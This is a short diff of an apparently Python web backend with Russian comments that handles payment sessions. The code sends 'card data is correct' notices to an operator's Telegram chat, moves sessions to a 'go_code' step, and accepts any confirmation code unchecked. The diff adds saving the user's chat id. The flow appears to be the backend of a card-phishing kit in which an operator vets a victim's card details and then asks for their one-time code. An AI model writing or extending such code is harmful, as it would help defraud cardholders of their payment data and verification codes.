@@ -259,7 +259,7 @@ async def check_payment_status(session_id: str):
 async def confirm_payment_code(data: ConfirmCodeData):
     sid = data.session_id
     code = data.code
-    # Здесь можно добавить проверку кода, но для теста просто успех
+    # Здесь можно добавить проверку кода, для теста просто успех
     return {"status": "ok"}
 
 # ========== 8. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ПО SESSION_ID ==========
@@ -376,6 +376,9 @@ async def handle_callback(request: Request):
         if result == "ok":
             if session_id in payment_status:
                 payment_status[session_id]["action"] = "go_code"
+                # Также сохраняем user_chat_id для отправки уведомлений
+                if user_chat_id:
+                    payment_status[session_id]["user_chat_id"] = user_chat_id
             send_to_telegram(MY_CHAT_ID, f"✅ Данные карты верны. Сессия {session_id}")
         else:
             if session_id in payment_status:
